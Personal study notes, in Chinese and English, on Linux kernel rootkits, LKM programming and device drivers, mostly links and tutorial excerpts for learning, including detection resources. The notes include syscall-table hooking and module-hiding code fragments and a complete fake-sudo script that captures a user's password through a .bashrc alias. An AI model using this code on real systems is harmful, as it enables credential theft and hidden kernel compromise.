* linux-rootkit-hack
* [[http://www.opensecuritytraining.info/Rootkits.html][Rootkits: What they are, and how to find them]]
这个教程就是没有英文字母，其实看起来还好,还有是windows的。
* [[http://phrack.org/issues/68/6.html#article][Android platform based linux kernel rootkit]]
 reference得一个个看掉：
 ** [1] "[[http://phrack.org/issues/50/5.html#article][Abuse of the Linux Kernel for Fun and Profit]]" by halflife
 [Phrack issue 50, article 05]
 上面的编译不通过，包含的头文件有问题，加了 -I/usr/src/kernels/$(shell
 uname -r)/include/ -I/usr/src/kernels/$(shell uname
 -r)/arch/x86/include/，但是貌似报错越来越多，看来是个系统工程。只能先看
 下面这个补一下LKM的知识（学东西就是各种坑的）。原来是这样，这个make要加
 上 -C $(KERNELDIR) M=$(PWD)。[[http://www.crashcourse.ca/introduction-linux-kernel-programming/lesson-5-details-details-details-bonus-lesson][Lesson 5: Details, details, details
 ... (BONUS LESSON)]] 简要讲解了这些make的选项的意义。linux根目录下的
 [[https://github.com/torvalds/linux/blob/master/Documentation/kbuild/modules.txt][Documentation/kbuild/modules.txt]] 更细致的解释,留坑待填。这篇文章太老了。
 很多头文件包不进来，函数声明也变了。文章里也说了：
 “If all does not go well ... well, I shall leave that to your
 nightmares.”但是这篇文章思路非常清晰，基本原来就是这样hook的,还是留待把。
 *** [[https://www.thc.org/papers/LKM_HACKING.html][(nearly) Complete Linux Loadable Kernel Modules]]
 再试一下这个教程。不行，一样的问题，基本的helloworld.c都编译不通过, 再
 找一个教程。
 ***  [[http://www.crashcourse.ca/introduction-linux-kernel-programming/introduction-linux-kernel-programming][introduction-linux-kernel-programming]]
 这本来是一个收费课程，
 [[http://www.crashcourse.ca/introduction-linux-kernel-programming-2nd-edition/introduction-linux-kernel-programming-2nd-edition][introduction-linux-kernel-programming-2nd-edition]] 现在还是收费的，没有
 美元信用卡，不过免费的就是有点过时，其实也没什么。[[http://kroah.com/lkn][Linux Kernel in a
 Nutshell(lkn)]] 是这个课程的参考书，不喜欢刚开始就翻大部头。刚开始的编译
 最新内核，启动不了。运行的内核版本3.10.0-229.7.2，CentOS 7，和教程里面
 的Ubuntu 10.4不一样，我只需要make module_install, make install。还有一
 个dracut代替教程里面的update-initramfs命令（可是我觉得没必要，因为
 initramfs已经生成了。是的，现代的内核就是这样，我从评论区和第二版教程上
 确认了。），不深究，先写LKM。（下面的坑其实都不用细看，只要这个教程学完
 就可以了。我留下这些note是觉得hack的过程，比单纯的罗列知识点更自然。当
 然我也是小白什么都不懂。）
 **** [[http://www.crashcourse.ca/introduction-linux-kernel-programming/lesson-8-module-diagnostics-and-init-and-exit-code-again][第八章]] 留下一个坑。
 : Exercise for the student: Predict what will happen with a message you
 : print from your crash3 module with a priority of KERN_DEBUG. Test it.
 我将crash3.c中的printk第一个宏改成了KERN_DEBUG，insmod之后，cat
 /var/log/message没有找到输出，搜索了一下。发现了[[http://www.makelinux.net/ldd3/chp-4-sect-2][Linux Device Drivers(ldd3), 3rd Edition -- chp-4-sect-2]]，以及[[http://oss.org.cn/kernel-book/ldd3/ch04s02.html][福利]]！ （这本书竟然有中
 文版，留坑待填。先不管，继续LKM。）[[https://stackoverflow.com/questions/4518420/where-does-output-of-print-in-kernel-go][linux - Where does output of print
 in kernel go?]] 这里看到答案。
 : ➜ crash3 dmesg|grep crash3
 : [26608.501991] crash3 module being loaded.
 : [26646.168736] crash3 module being unloaded.
 : [29784.621436] crash3 module being loaded.
 : [35418.826363] crash3 module being unloaded.
 通过上面，确实看到了输出，不过不知道原理（[[https://github.com/torvalds/linux/blob/master/kernel/printk/printk.c][linux/kernel/printk.c]] 源码留坑)
 **** 还是[[http://www.crashcourse.ca/introduction-linux-kernel-programming/lesson-8-module-diagnostics-and-init-and-exit-code-again][第八章]] 下面有一个练习：
 : Exercise for the student: If you're running the stock Ubuntu kernel
 : (and you should be), how can you verify that the kernel doesn't
 : support forced module unloading? Besides, of course, just trying it
 : and having it fail.
 本来想留个坑的，算了。参见[[http://cateee.net/lkddb/web-lkddb/MODULE_FORCE_UNLOAD.html][CONFIG_MODULE_FORCE_UNLOAD]]。
 至于原理嘛，看[[https://github.com/torvalds/linux/blob/master/kernel/module.c#L984][这里]], 还有 [[https://github.com/torvalds/linux/blob/master/kernel/module.c#L1032][这里]]。
 **** [[http://www.crashcourse.ca/introduction-linux-kernel-programming/lesson-9-all-about-module-parameters][第九章]] 留下一个坑（很好的思路）：
#+begin_example
 While we've restricted ourselves to just the int module parameter
 type, there are a number of others including uint, byte, short,
 ushort, pointers, character strings and more. To see the full list,
 peruse the kernel header file include/linux/moduleparam.h.

 An excellent way to understand any kernel feature is to scan the
 kernel source tree looking for examples of its usage. Assuming that
 your system has the module usbhid, use modinfo to check its
 properties, then examine its source file under
 drivers/hid/usbhid/hid-core.c to examine its parameters, and compare
 what you see with what's under the /sys directory.
#+end_example

 **** [[http://www.crashcourse.ca/introduction-linux-kernel-programming/lesson-10-kernel-symbol-table-and-why-you-should-care][第十章]] 的坑：
 : Exercise for the student: By far, the most common export directive is
 : EXPORT_SYMBOL. If you know how to use grep, scan the kernel source
 : tree to see how many times someone is very carefully exporting a
 : symbol only to GPL-compatible modules with EXPORT_SYMBOL_GPL.
 这道题目非常简单：
 : ➜ intro-linux-kernel-programming grep -r EXPORT_SYMBOL_GPL ./linux/*|wc -l
 : 16483
 这一章教程称赞了"[[http://reiber.org/nxt/pub/Linux/LinuxKernelDevelopment/Linux.Kernel.Development.3rd.Edition.pdf][Linux Kernel Development(lkd)]]"的作者[[https://www.rlove.org/][Robert Love]]（也是
 本教程参考书[[http://kroah.com/lkn/][lkn]] 的作者）是kernel wizard。这位巫师说:一个module其实比内
 核内部得到更加受限制的内核符号表。
 : "Core code can call any non-static interface in the kernel because all
 : core source files are linked into a single base image."That means that
 : normal non-static, unexported symbols in kernel space are available to
 : other routines that are built into the kernel, but are not available
 : to loadable modules. In short, your modules are working with a more
 : restricted kernel symbol table than other routines that are part of
 : the kernel itself.
 还简洁的指出，所谓系统API不过是内核的导出符号而已。
 : "The set of kernel symbols that are exported are known as the exported
 : kernel interfaces or even (gasp) the kernel API."
 **** [[http://www.crashcourse.ca/introduction-linux-kernel-programming/lesson-12-adding-proc-files-your-modules-part-2][十二章]] 留下了RTFS( Read The Fine/FUCK Source)的坑,
 并给我留下指引：
#+begin_example
 - fs/proc/ -- a directory of code to generate a number of proc files,
 including some you've already seen,
 - include/linux/fs.h -- declarations for various, generic filesystem
 structures,
 - include/linux/proc_fs.h -- declarations for the various proc file
 routines, many of them declared as static inlines,
 - include/linux/seq_file.h -- declarations specifically for the
 "sequence file" implementation of proc files, and
 - the book "Linux Device Drivers (3rd ed)",referred to as "LDD3" and
 available online here -- it has an
 excellent section on proc files in Chapter 4 that I'll be referring to
 a bit later on.
#+end_example
 [[http://www.makelinux.net/ldd3/][Linux Device Drivers (3rd ed)]]这本书就是上文说到[[http://oss.org.cn/kernel-book/ldd3/][福利]] 那本，真是缘分。真
 是可惜，这本书有新版本了，[[https://github.com/jesstess/ldd4][ldd4]] 。
 **** [[http://www.crashcourse.ca/introduction-linux-kernel-programming/lesson-12-adding-proc-files-your-modules-part-2][十二章]] 课后作业：
#+begin_example
 Exercise for the student: Based simply on what we've explained above,
 trace through the code in kernel/irq/proc.c to get a general idea of
 how that entire subdirectory comes into existence.
 Additional exercise for the student: If you're feeling ambitious,
 combine the earlier jiffies and HZ examples into a single module, and
 put those two proc files underneath a /proc directory of your
 name. 
 There is an additional challenge here, though -- you need to add
 exit code so that your proc files and directory are deleted when you
 unload the module and, no, I'm not going to explain how to do
 that. You're on your own there. Time to get your feet wet and jump
 into the kernel code and figure out how to do that just from reading
 the source and the header files mentioned above.
#+end_example
 代码在这里[[https://github.com/torvalds/linux/blob/master/kernel/irq/proc.c][kernel/irq/proc.c]] 留待把。
 ** [2] "[[http://phrack.org/issues/52/18.html#article][Weakening the Linux Kernel]]" by plaguez
 [Phrack issue 52, article 18]
 * Writing Modern Linux Rootkits
 ** [[http://turbochaos.blogspot.jp/2013/09/linux-rootkits-101-1-of-3.html][Modern Linux Rootkits 101]]
 *** 留一个坑
 : It's important to note that there are attempts to prevent runtime
 : loading of new LKM's. You can do this by setting the flag in
 : /proc/sys/kernel/modules_disabled. There won't be much talk about
 : bypassing that on this first part, but we'll look at it and get around
 : it in part 3.
 modules_disabled应该是在这里。
 https://github.com/torvalds/linux/blob/master/kernel/module.c
 *** 全文思路
 通过strace分析得到要改写的内核api,然后套一个module模板代码，
 将要钩住的函数改掉。
 *** 分析api
 **** strace ls
 : strace -v -s 1024 -o file /bin/ls
 : This will cause strace to be verbose, increase default string limit,
 : and write to a file called 'file'.
 通过strace命令分析ls的调用的内核接口。然后得到如下总结。
 : If you were to man 2 system_call_name, you can see most everything
 : you'd want to know. We have a description, arguments, types, usages,
 : and more readily available.
 **** man 2 api_interface
 通过man 2 xxx来查内核接口，并且得到ls命令大概的实现流程，漂亮。
#+begin_example
 With a new understanding about how these functions work, let's put it
 all together to understand how ls works with system calls to display
 the inormation. It starts off with openat to open a file descriptor
 with the given directory, which was current (.) in our case. Then it
 grabs the information on each of the files/directories in the given
 directory by using getdents and fstat. Getdents retriveving virtual
 filesystem information such as inode number and name. Fstat retrieving
 common information such as timestamps, privilege values, block size,
 and etc. Finally, we take the parsed values of the program and write
 them to the standard out terminal screen.
#+end_example
 最后分析得到的结论是钩住write()。
 *** rootkit模板
 **** sys_call_table地址
 找sys_call_table,这里直接暴力查找的，O(n)可以接受，
 代码在find()这个自己写的函数内，可以替换成其他手法。
 **** 改写系统调用表(sys_call_table)，考虑内核写保护
 :  /* disable write protect on page in cr0 */
 :  write_cr0(read_cr0() & (~ 0x10000));
 : 
 :  /* hijack functions */
 :  o_write = (void *) xchg(&sys_call_table[__NR_write],rooty_write);
 : 
 :  /* return sys_call_table to WP */
 :  write_cr0(read_cr0() | 0x10000);
 如上，关闭控制寄存器cro的写保护(WP)。然后将自己写的假的系统调用
 rooty_write和系统调用表内保存的write的地址交换。重新开启cro写保护。最后
 就是rooty_write实现了。注意函数签名要和write完全一样。这里只是示意一下，
 有bug的。
 **** 隐藏module本身
 : /* Do kernel module hiding*/
 :  list_del_init(&__this_module.list);
 :  kobject_del(&THIS_MODULE->mkobj.kobj);
 如上，将module“删除”了，这样rmmod也不能正常卸载驱动了，开发的时候要注释
 掉。 
 *** reference
 **** [[https://en.wikipedia.org/wiki/System_call][System call]]
 : Tools such as strace and truss allow a process to execute from start
 : and report all system calls the process invokes, or can attach to an
 : already running process and intercept any system call made by said
 : process if the operation does not violate the permissions of the
 : user. This special ability of the program is usually also implemented
 : with a system call, e.g. strace is implemented with ptrace or system
 : calls on files in procfs.
 **** [[http://man7.org/linux/man-pages/man2/syscalls.2.html][syscalls - Linux system calls]]
#+begin_example
 Roughly speaking, the code belonging to the system call with number
 __NR_xxx defined in /usr/include/asm/unistd.h can be found in the
 Linux kernel source in the routine sys_xxx().  (The dispatch table for
 i386 can be found in /usr/src/linux/arch/i386/kernel/entry.S.)  There
 are many exceptions, however, mostly because older system calls were
 superseded by newer ones, and this has been treated somewhat
 unsystematically.  On platforms with proprietary operating-system
 emulation, such as parisc, sparc, sparc64, and alpha, there are many
 additional system calls; mips64 also contains a full set of 32-bit
 system calls.
#+end_example
 **** [[http://www.ibm.com/developerworks/library/l-system-calls/][Kernel command using Linux system calls]]
 **** [[http://blog.csdn.net/ce123_zhouwei/article/details/8446520][linux内核中的fastcall和asmlinkage宏]]
 对x86平台来说
 : #define asmlinkage CPP_ASMLINKAGE __attribute__((regparm(0)))  
 : #define FASTCALL(x) x __attribute__((regparm(3)))  
 : #define fastcall    __attribute__((regparm(3)))  
 __attribute__((regparm(0)))：告诉gcc编译器该函数不需要通过任何寄存器来
 传递参数，参数只是通过堆栈来传递。
 __attribute__((regparm(3)))：告诉gcc编译器这个函数可以通过寄存器传递多
 达3个的参数，这3个寄存器依次为EAX、EDX 和 ECX。
 ** [[http://turbochaos.blogspot.jp/2013/10/writing-linux-rootkits-201-23.html][Writing Modern Linux Rootkits 201 - VFS]]
 本教程不仅仅是学习作者的手法，更要学习他的分析的思路。
 *** VFS的优点
#+begin_example
 Virtual file systems (VFS) are an abstraction layer to allow easy
 communication with other filesystems such as ext4, reiser fs, or other
 special filesystems like procfs. This extra layer translates easy to
 use VFS functions to their appropriate functions offered by the given
 filesystem. This allows a developer to interact solely with the VFS
 and not needing to find, handle, and support the different functions
 and types of individual filesystems.

 There are two major reasons why we should care about this. First, we
 can hook a VFS function and deal with that one function to hide
 information from the concrete filesystem. This allows a one stop shop
 hijack for hiding from any VFS supported filesystem (the majority of
 them). With this we will have the ability to hide files and
 directories from most tool with ease. The second reason is that procfs
 is a supported filesystem.
#+end_example

 *** Procfs (Proc filesystem)简介
#+begin_example
 The proc filesystem is an interface to easily manage kernel data
 structures. This includes being able to retrieve and even change data
 inside the linux kernel at runtime. More importantly, for us, it also
 provides an interface for process data. Each process is mapped to
 procfs by its given process id number. Retrieving this pid number
 allows any tool to pull, with appropriate privileges, whatever data it
 needs to find out about that given process. This includes its memory
 mapping, memory usage, network usage, parameters, environment
 variables, and etc. Given this, if we know the pid and we're hooked
 into the VFS for procfs, we can also manipulate data returned to these
 tools to hide processes.
#+end_example
 *** 分析procfs,找到要劫持的函数
 : We will then need to get another VFS pointer to /proc for the procfs
 : to hide processes. But what pointer/function do we want to hijack?
 *** 通过一系列分析，选定readdir和filldir
 : So, when we hijack file->f_op->readdir all we really need to do is
 : manage our own filldir function, parse it, and then call the real
 : readdir with our filldir values.
 *** 对kernel3.11之后，vfs_readdir被iter_dir替换了,待更新
#+begin_example
 With 3.11 kernels, vfs_readdir has been completely removed and now
 uses iter_dir for the new iterator value in file_operations. This
 looks like "file->f_op->iterate(file, ctx);" where ctx is struct
 dir_context *ctx. This structure looks like:

 struct dir_context {
              const filldir_t actor;
                       loff_t pos;
 };
 I will update this post as soon as full coverage for 3.11 kernels is
 completed.
#+end_example

 ** [[http://turbochaos.blogspot.jp/2013/10/writing-linux-rootkits-301_31.html][Modern Linux Rootkits 301 - Bypassing modules_disabled security]]
 真期待后续的教程。后面两篇都反复看不懂。
 : I believe next I'll be starting a malware writing series so we can
 : start building malware functionality and then adding rootkit
 : functionality to hide what the malware is doing. It'll involve
 : communication over an already bounded externally available port, magic
 : packets for reverse shells, and complete hiding from our rootkit. This
 : all depends on my time available and how well this current series
 : does.

 ** [[http://turbochaos.blogspot.jp/2013/11/ghetto-privilege-escalation-with-bashrc.html?view%3Dsidebar][Ghetto Privilege Escalation With .bashrc]]
    好猥琐的手法。开始看作者其他的文章，一个人不可能一下子这么牛逼的。
    首先将下面脚本保存成fake-sudo.sh。命令行"chmod +x fake-sudo.sh"加上执行权限。
    在.bashrc加上"alias sudo="/location/to/fake-sudo.sh"。 
#+begin_example
#!/bin/bash
    if [ ! -f .chak ]; then                       #如不存在.chak文件
         echo -n "[sudo] password for `whoami`: ";    #现实要求输入密码
          stty -echo;                                  #关闭回显
           read password;                               #读取密码，保存到变量password
            stty echo;                                   #打开回显
             echo -e $password > .chak;                   #将密码保存,-e:enable backslash escapes,测试无效果。
              echo ""
               sleep 2
                echo "Sorry, try again";
                fi
                string="/bin/sudo"                            #$#：添加到shell中的参数个数
                while test $# -gt 0; do
                     string+=" $1";                               #添加$1
                      shift;                                       #命令参数左移，$3-->$2,$2-->$1,$1消失，$0保持不变。
                      done
                      $string                                       #执行命令
#+end_example

                      然后等下次作者sudo的时候，最后的结果：
                      : ➜  ~  sudo yum search ssh
                      : [sudo] password for ice: 
                      : Sorry, try again
                      : [sudo] password for ice: 
                      然后.chak文件将保存你输入的密码。
                      最后尝试下su命令不能写出对应的版本，因为su如果输入错误直接认证失败了，除非钩住登陆的方法。
                      ** VFS
                      [[http://security.tencent.com/index.php/opensource/detail/16][Linux Rootkit (vfs hook) 隐藏进程检测工具]]
                      [[http://staronmytop.blog.51cto.com/6366057/1119475][Linux下的RootKit简单介绍与分析]]
                      [[http://pages.cpsc.ucalgary.ca/~crwth/programming/VFS/VFS.php][How to write a Linux VFS filesystem module]]
                      * windows rootkits
                      ** [[http://www.phrack.org/issues/63/8.html][Raising The Bar For Windows Rootkit Detection]]
                         总结windows rootkit的演变历史。
#+begin_example
                         First generation rootkits were primitive.  They simply replaced /
                         modified key system files on the victim's system.  The UNIX login
                         program was a common target and involved an attacker replacing the
                         original binary with a maliciously enhanced version that logged user
                         passwords.  Because these early rootkit modifications were limited to
                         system files on disk, they motivated the development of file system
                         integrity checkers such as Tripwire [1].

                         In response, rootkit developers moved their modifications off disk to
                         the memory images of the loaded programs and, again, evaded
                         detection. These 'second' generation rootkits were primarily based
                         upon hooking techniques that altered the execution path by making
                         memory patches to loaded applications and some operating system
                         components such as the system call table. Although much stealthier,
                         such modifications remained detectable by searching for heuristic
                         abnormalities. For example, it is suspicious for the system service
                         table to contain pointers that do not point to the operating system
                         kernel. This is the technique used by VICE [2].

                         Third generation kernel rootkit techniques like Direct Kernel Object
                         Manipulation (DKOM), which was implemented in the FU rootkit [3],
                         capitalize on the weaknesses of current detection software by
                         modifying dynamically changing kernel data structures for which it is
                         impossible to establish a static trusted baseline.
#+end_example
                         * from reddit
                         ** [[http://core.ipsecs.com/rootkit/kernel-rootkit/kbeast-v1/][A Linux Kernel Module Rootkit has been released in 2012: Kbeast]]
                         ** Rootkit.com mirror?
                         https://web.archive.org/web/*/rootkit.com/vault/* 
                         http://opensecuritytraining.info/Rootkits.html
                         ** [[https://www.syscan360.org/slides/2014_EN_AdvancedBootkitTechniquesOnAndroid_ChenZhangqiShendi.pdf][Advanced Bootkit Techniques on Android]]
                         ** [[http://s3.eurecom.fr/~zaddach/docs/Recon14_HDD.pdf][Exploring the impact of a hard drive backdoor]]
                         ** [[https://github.com/dynup/kpatch][kpatch: dynamic kernel patching]]
                         kpatch is a Linux dynamic kernel patching infrastructure which allows
                         you to patch a running kernel without rebooting or restarting any
                         processes. It enables sysadmins to apply critical security patches to
                         the kernel immediately, without having to wait for long-running tasks
                         to complete, for users to log off, or for scheduled reboot windows. It
                         gives more control over uptime without sacrificing security or
                         stability.
                         ** [[https://www.blackhat.com/presentations/bh-usa-09/TERESHKIN/BHUSA09-Tereshkin-Ring3Rootkit-SLIDES.pdf][Introducing Ring -3 Rootkits]]
                         ** [[http://timeglider.com/timeline/5ca2daa6078caaf4][这个时间线好强大，值得深入google!]]
                         ** Ring3 / Ring0 Rootkit Hook Detection
                         [[http://www.malwaretech.com/2013/09/ring3-ring0-rootkit-hook-detection-12.html][Ring3 / Ring0 Rootkit Hook Detection 1/2]]
                         [[http://www.malwaretech.com/2013/10/ring3-ring0-rootkit-hook-detection-22.html][Ring3 / Ring0 Rootkit Hook Detection 2/2]]
                         ** [[http://repo.hackerzvoice.net/depot_madchat/vxdevl/library/Inside%2520Windows%2520Rootkits.pdf][Inside Windows Rootkits]]
                         ** [[https://media.blackhat.com/us-13/US-13-Vuksan-Press-ROOT-to-Continue-Detecting-MacOS-and-Windows-Bootkits-with-RDFU-WP.pdf][ROOTKIT DETECTION FRAMEWORK FOR UEFI]]
                         ** [[http://news.saferbytes.it/analisi/2012/09/uefi-technology-say-hello-to-the-windows-8-bootkit/][UEFI technology: say hello to the Windows 8 bootkit!]]
                         ** [[https://github.com/quarkslab/dreamboot][dreamboot UEFI bootkit]]
                         ** [[http://www.exfiltrated.com/research.php#BIOS_Based_Rootkits][BIOS Based Rootkits]]
                         ** [[https://media.blackhat.com/us-13/US-13-Butterworth-BIOS-Security-Slides.pdf][BIOS Chronomancy:Fixing the Core Root of Trust for Measurement]]
                         ** [[https://www.hackinparis.com/sites/hackinparis.com/files/Slidesthomasroth.pdf][Next generation mobile rootkits]]
                         ** [[http://beneathclevel.blogspot.co.uk/][A Linux rootkit tutorial - Makefile and symbols]]
                         ** [[http://www.unixist.com/security/detecting-hidden-files/index.html][>: Detecting hidden files]]
                         ** [[http://shell-storm.org/blog/Simple-Hook-detection-Linux-module/][Simple hook detection Linux module]]
                         ** [[https://reverse.put.as/wp-content/uploads/2013/05/SysScan-13-Presentation.pdf][Revisiting Mac OS X Kernel Rootkits!]]
                         ** Syscall Hijacking: Simple Rootkit
                         [[https://memset.wordpress.com/2010/12/28/syscall-hijacking-simple-rootkit-kernel-2-6-x/][Syscall Hijacking: Simple Rootkit (kernel 2.6.x)]]
                         [[https://memset.wordpress.com/2011/03/18/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x-2/][Syscall Hijacking: Dynamically obtain syscall table address (kernel 2.6.x) #2]]
                         ** [[http://phrack.org/issues/68/6.html][Android platform based linux kernel rootkit]]
                         ** [[http://poppopret.org/2013/01/07/suterusu-rootkit-inline-kernel-function-hooking-on-x86-and-arm/][Suterusu Rootkit: Inline Kernel Function Hooking on x86 and ARM]]
                         ** [[https://www.trailofbits.com/resources/advanced_macosx_rootkits_paper.pdf][ADVANCED MAC OS X ROOTKITS]]
                         ** [[http://rkhunter.sourceforge.net/][The Rootkit Hunter project]]
                         ** [[http://www.symantec.com/connect/articles/detecting-rootkits-and-kernel-level-compromises-linux][Detecting Rootkits And Kernel-level Compromises In Linux]]
                         ** [[http://static.usenix.org/event/sec09/tech/full_papers/hund.pdf][Return-Oriented Rootkits Bypassing Kernel Code Integrity Protection Mechanisms]]
                         ** [[https://media.blackhat.com/bh-ad-11/Oi/bh-ad-11-Oi-Android_Rootkit-Slides.pdf][Yet Another Android Rootkit]]
                         ** [[http://phrack.org/issues/58/7.html][Linux on-the-fly kernel patching without LKM]]
                         ** [[www.la-samhna.de/library/rootkits/list.html][List of Kernel Rootkits - Samhain Labs]]
                         ** [[https://www.blackhat.com/presentations/bh-jp-05/bh-jp-05-sparks-butler.pdf]["shadow Walker" Raising The Bar For Rootkit Detection]]
                         ** [[https://www.reddit.com/r/linux/comments/3gw172/a_good_book_on_how_the_linux_kernel_works/][linux内核的好书]]
                         http://pdos.csail.mit.edu/6.828/2014/xv6.html
                         : I recommend Xv6. This is a "teaching kernel", based on Linux
                         : predecessor v6. The advantage is that Xv6 is much simpler, but
                         : maintains the same skeleton as Linux. The full source code is
                         : available and runs in a VM. The related book is very readable, and
                         : makes specific references to source code, so it's clear.

                         http://www.cs.uic.edu/~jbell/CourseNotes/OperatingSystems/ 
                         : PS　"Computer Architecture, A Quantitative Approach ", i agree, it's
                         : an amazing book
                         * linux-device-drivers-3rd
                         这本书过时了，有第四版了，可惜没有电子版看起来不方便。
                         ** [[http://www.makelinux.net/ldd3/chp-1-sect-1][1.1. The Role of the Device Driver]]
                         : The distinction between mechanism and policy is one of the best ideas
                         : behind the Unix design. Most programming problems can indeed be split
                         : into two parts: "what capabilities are to be provided" (the mechanism)
                         : and "how those capabilities can be used" (the policy). If the two
                         : issues are addressed by different parts of the program, or even by
                         : different programs altogether, the software package is much easier to
                         : develop and to adapt to particular needs.

#+begin_example
When writing drivers, a programmer should pay particular attention to
this fundamental concept: write kernel code to access the hardware,
but don't force particular policies on the user, since different users
have different needs. The driver should deal with making the hardware
available, leaving all the issues about how to use the hardware to the
applications. A driver, then, is flexible if it offers access to the
hardware capabilities without adding constraints. Sometimes, however,
some policy decisions must be made. For example, a digital I/O driver
may only offer byte-wide access to the hardware in order to avoid the
extra code needed to handle individual bits.
#+end_example
** [[http://www.makelinux.net/ldd3/chp-1-sect-2][1.2. Splitting the Kernel]]
: Device control
: Almost every system operation eventually maps to a physical
: device. With the exception of the processor, memory, and a very few
: other entities, any and all device control operations are performed by
: code that is specific to the device being addressed. That code is
: called a device driver. The kernel must have embedded in it a device
: driver for every peripheral present on a system, from the hard drive
: to the keyboard and the tape drive. This aspect of the kernel's
: functions is our primary interest in this book.
** [[http://www.makelinux.net/ldd3/chp-1-sect-3][1.3. Classes of Devices and Modules]]
*** Character devices
#+begin_example
A character (char) device is one that can be
accessed as a stream of bytes (like a file); a char driver is in
charge of implementing this behavior. Such a driver usually implements
at least the open, close, read, and write system calls. The text
console (/dev/console) and the serial ports (/dev/ttyS0 and friends)
are examples of char devices, as they are well represented by the
stream abstraction. Char devices are accessed by means of filesystem
nodes, such as /dev/tty1 and /dev/lp0. The only relevant difference
between a char device and a regular file is that you can always move
back and forth in the regular file, whereas most char devices are just
data channels, which you can only access sequentially. There exist,
nonetheless, char devices that look like data areas, and you can move
back and forth in them; for instance, this usually applies to frame
grabbers, where the applications can access the whole acquired image
using mmap or lseek.
#+end_example
*** Block devices
#+begin_example
Like char devices, block devices are accessed by
filesystem nodes in the /dev directory. A block device is a device
(e.g., a disk) that can host a filesystem. In most Unix systems, a
block device can only handle I/O operations that transfer one or more
whole blocks, which are usually 512 bytes (or a larger power of two)
bytes in length. Linux, instead, allows the application to read and
write a block device like a char device—it permits the transfer of any
number of bytes at a time. As a result, block and char devices differ
only in the way data is managed internally by the kernel, and thus in
the kernel/driver software interface. Like a char device, each block
device is accessed through a filesystem node, and the difference
between them is transparent to the user. Block drivers have a
completely different interface to the kernel than char drivers.
#+end_example
*** Network interfaces
#+begin_example
Any network transaction is made through an interface, that is, a
device that is able to exchange data with other hosts. Usually, an
interface is a hardware device, but it might also be a pure software
device, like the loopback interface. A network interface is in charge
of sending and receiving data packets, driven by the network subsystem
of the kernel, without knowing how individual transactions map to the
actual packets being transmitted. Many network connections (especially
those using TCP) are stream-oriented, but network devices are,
usually, designed around the transmission and receipt of packets. A
network driver knows nothing about individual connections; it only
handles packets.
#+end_example

```

作者：Shawn C
链接：https://www.zhihu.com/question/33695415/answer/85075735
来源：知乎
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

基于Linux内核的rootkit的历史可以赘述到1990年代中期，从最早的hijack syscall/pghandler/IDT到mem
injection，大部分的手法都是一个特点：HOOK。HOOK怎么下是门学问，这个星球上最有缺的ROOTKIT是能让HOOK形成一条跟userspace完全对应的codepath，如何和密码工程配合则会让此类持久化技术发挥到极致，编写ROOTKIT的质量的好坏大部分情况都取决于对内核本身的了解程度，就像你的了解你最爱的人的各个方面是一样的道理;-)

那一般rootkit怎么防御和检测呢？常见的检测思路是采用对比内存DUMPCORE和SYMTABLE之间的差异，如果有差异说明是有HOOK存在，这时需要去examine到底是正常的HOOK（比如虚拟化）还是由于ROOTKIT造成的。

要了解任何一项old school hacking技术，都必读Phrack。以下材料基本让你看到整个技术进化路线图。

Linux kernel rootkit:
-----------------------------------------------------------------------------
Weakening the Linux Kernel
http://www.phrack.org/archives/issues/52/18.txt

Advances in Kernel Hacking
http://www.phrack.org/archives/issues/58/6.txt

Runtime kernel kmem patching
http://althing.cs.dartmouth.edu/local/vsc07.html

Linux on-the-fly kernel patching without LKM
http://phrack.org/archives/issues/58/7.txt

Malicious Code Injection via /dev/mem
https://www.blackhat.com/presentations/bh-europe-09/Lineberry/BlackHat-Europe-2009-Lineberry-code-injection-via-dev-mem.pdf

Modern Linux Rootkits 301 - Bypassing modules_disabled security
http://turbochaos.blogspot.hk/2013/10/writing-linux-rootkits-301_31.html

Handling Interrupt Descriptor Table for fun and profit:
http://www.phrack.org/archives/issues/59/4.txt

Hijacking Linux Page Fault Handler: Exception Table
http://www.phrack.org/archives/issues/61/7.txt

Kernel Rootkit Experiences
http://www.phrack.org/archives/issues/61/14.txt

Mistifying the debugger
http://www.phrack.org/archives/issues/65/8.txt

Especially thanks to THC's paper, which was released in 1999:
[Complete Linux Loadable Kernel Modules]
https://www.thc.org/papers/LKM_HACKING.html
----------------------------------------------------------------------------
```
